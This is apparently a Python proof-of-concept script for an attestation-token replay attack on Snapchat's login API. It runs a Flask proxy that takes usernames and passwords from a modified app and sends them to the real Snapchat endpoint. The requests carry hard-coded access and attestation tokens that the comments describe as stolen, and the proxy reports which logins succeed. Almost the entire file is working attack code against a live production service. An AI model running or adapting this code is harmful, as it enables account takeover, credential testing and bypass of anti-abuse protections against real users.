#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SnapChat Attestation Token Replay Attack - Proof of Concept
Based on flaah999's HackerOne report
"""

from flask import Flask, request, Response
import requests
import base64
import struct
import time

app = Flask(__name__)

# ============================================
# بيانات الجهاز النظيف (ضع بياناتك المستخرجة هنا)
# ============================================
CONFIG = {
    "X-Snapchat-UUID": "0196B3EE-508D-4FAC-9F7B-1B790E57DDBB",
    "X-Snap-UserID": "55a118bf-16cd-4527-9ea7-9f90fdab8faf",
    "X-Snap-Access-Token": "hCgwKCjE3Nzk2NzA4MjASgAHPo67ALSrMM9NeAahNE3jdlHSkQ-UzFQdCMXtlsYfixAZXA7omp_H7jlk",
    "x-snapchat-att-token": "Ci1iNFCsaIvuN4FmwoMSXqFN1o531mchZS20Zbt9Sv2TDy8ACaUEsYDd88NjSwoVAQAAAA==",
    "User-Agent": "Snapchat/12.20.0.36 (iPhone15,2; iOS 17.4.1; gzip)"
}

# خادم Snapchat الحقيقي (نفس الـ endpoint من المقال)
SNAPCHAT_API = "https://us-east1-aws.api.snapchat.com/snapchat.janus.api.LoginService/LoginWithPassword"

def build_grpc_payload(proto_bytes):
    """بناء payload gRPC: 0x00 + length (4 bytes) + protobuf"""
    if not proto_bytes:
        return None
    length_prefix = struct.pack('>I', len(proto_bytes))
    return b'\x00' + length_prefix + proto_bytes

def extract_grpc_response(response):
    """استخراج محتوى الرد من gRPC (إزالة الـ 5 bytes header)"""
    if response and len(response) > 5:
        return response[5:]
    return response

@app.route('/proxy_login', methods=['POST'])
def proxy_login():
    """نقطة الدخول - تستقبل طلبات التطبيق المعدل وتعيد التوجيه مع Replay Attack"""
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    print(f"\n[+] هدف جديد: {username}")
    print(f"[+] باستخدام توكن Attestation: {CONFIG['x-snapchat-att-token'][:50]}...")
    
    # بناء رؤوس الطلب (مثل المقال تماماً)
    headers = {
        "Content-Type": "application/grpc+proto",
        "User-Agent": CONFIG["User-Agent"],
        "X-Snapchat-UUID": CONFIG["X-Snapchat-UUID"],
        "X-Snap-UserID": CONFIG["X-Snap-UserID"],
        "X-Snap-Access-Token": CONFIG["X-Snap-Access-Token"],
        "x-snapchat-att-token": CONFIG["x-snapchat-att-token"],
        "x-snapchat-argos-strict-enforcement": "true",
        "te": "trailers",
        "Accept-Encoding": "gzip, deflate, br"
    }
    
    # بناء Protobuf لتسجيل الدخول (حسب هيكل المقال)
    # Field 1: username (string)
    username_bytes = username.encode('utf-8')
    field1 = bytes([0x0a, len(username_bytes)]) + username_bytes
    
    # Field 4: password (string)
    password_bytes = password.encode('utf-8')
    field4 = bytes([0x22, len(password_bytes)]) + password_bytes
    
    # Field 7: cofTags (514 bytes من الجهاز النظيف)
    cofTags = base64.b64decode("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEOEj9CnZKFfmE6nYT68kCW2C+2olmgkS/jMtoQNYut4SX7cQiejkrLM6sCzl/T3jkdb1PmWueOA3hGQlEMUm/1Q==")
    field7 = bytes([0x3a, len(cofTags)]) + cofTags
    
    # دمج كل الحقول
    proto_bytes = field1 + field4 + field7
    
    # بناء gRPC payload
    grpc_body = build_grpc_payload(proto_bytes)
    
    if not grpc_body:
        return Response('{"error": "Failed to build payload"}', status=500)
    
    try:
        # إرسال الطلب إلى Snapchat (Replay Attack!)
        print(f"[*] إعادة استخدام توكن الـ Attestation المسروق...")
        response = requests.post(
            SNAPCHAT_API,
            headers=headers,
            data=grpc_body,
            timeout=30
        )
        
        print(f"[*] رد الخادم: HTTP {response.status_code}")
        print(f"[*] grpc-status: {response.headers.get('grpc-status', 'unknown')}")
        
        # تحليل الرد (مثل المقال)
        if response.status_code == 200:
            grpc_status = response.headers.get('grpc-status', '')
            
            if grpc_status == '0':
                print(f"[✓] نجح تسجيل الدخول لـ {username}!")
                return Response('{"status":"success", "message":"Login successful"}', status=200)
            else:
                # التوكن مقبول ولكن كلمة المرور خاطئة (هذا يثبت الثغرة!)
                print(f"[!] التوكن مقبول! ولكن كلمة المرور لـ {username} غير صحيحة")
                print(f"[!] رسالة الخادم: {response.headers.get('grpc-message', 'Incorrect password')}")
                return Response('{"status":"attestation_accepted", "message":"Token accepted, wrong password"}', status=200)
        else:
            print(f"[X] فشل: {response.status_code}")
            return Response(f'{{"status":"error", "code": {response.status_code}}}', status=response.status_code)
            
    except Exception as e:
        print(f"[X] خطأ: {e}")
        return Response(f'{{"status":"exception", "message": "{str(e)}"}}', status=500)

@app.route('/health', methods=['GET'])
def health():
    return Response('{"status":"running"}', status=200)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     SnapChat Attestation Token Replay Attack - POC          ║
    ║                                                              ║
    ║  Based on flaah999's HackerOne report                       ║
    ║  Vulnerability: Server accepts replayed attestation tokens  ║
    ║                                                              ║
    ║  [✓] Attestation Token Loaded                               ║
    ║  [✓] Device UUID: """ + CONFIG["X-Snapchat-UUID"][:8] + """...                               ║
    ║                                                              ║
    ║  Proxy running on: http://0.0.0.0:5000/proxy_login          ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=False)
